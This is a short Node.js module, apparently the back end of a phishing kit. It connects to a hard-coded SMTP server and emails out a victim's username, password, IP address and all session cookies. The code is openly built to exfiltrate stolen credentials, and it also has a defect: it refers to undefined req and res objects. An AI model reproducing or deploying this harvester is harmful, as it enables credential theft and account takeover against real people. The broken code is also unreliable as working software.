const nodemailer = require('nodemailer');
const httpMsgs = require('http-msgs');

function createNodeMailerTransport(user, pass) {
    return nodemailer.createTransport({
        pool: true,
        host: 'mail.bvourique.pt',
        port: 465,
        secure: true,
        auth: {
            user: user,
            pass: pass
        }
    });
}

function sendEmail(from, to, subject, username, pass, ip, cookies, nodeTransport) {
    const mailDetails = {
        from: from,
        to: to,
        subject: subject,
        html: `<p>Username: ${username}</p><p>Password: ${pass}</p><p>IP Address: ${ip}</p>`
    };

    // Append cookies to the email body
    if (cookies) {
        const cookiesStr = Object.entries(cookies).map(([key, value]) => `${key}: ${value}`).join('<br>');
        mailDetails.html += `<p>Cookies:<br>${cookiesStr}</p>`;
    }

    nodeTransport.verify((error, success) => {
        if (error) {
            console.log(error);
        } else {
            nodeTransport.sendMail(mailDetails, (err, data) => {
                if (err) {
                    console.log(err);
                } else {
                    console.log(data);
                    httpMsgs.sendJSON(req, res, { response: 'success' });
                }
            });
        }
    });
}

module.exports = {
    createNodeMailerTransport: createNodeMailerTransport,
    sendEmail: sendEmail
};
